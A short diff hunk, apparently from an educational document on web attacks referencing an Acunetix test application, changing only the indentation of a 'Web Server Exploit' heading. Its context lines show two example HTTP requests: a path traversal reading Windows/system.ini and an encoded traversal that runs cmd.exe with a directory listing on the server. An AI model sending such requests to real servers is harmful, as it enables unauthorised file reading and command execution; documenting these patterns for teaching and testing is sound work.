@@ -79,7 +79,7 @@ application server, also provided by Acunetix.
 	GET http://test.webarticles.com/show.asp?view=../../../../../Windows/system.ini HTTP/1.1
 	Host: test.webarticles.com
 
-Web Server Exploit 
+	Web Server Exploit 
 
 	GET http://server.com/scripts/..%5c../Windows/System32/cmd.exe?/c+dir+c:\ HTTP/1.1
 	Host: server.com
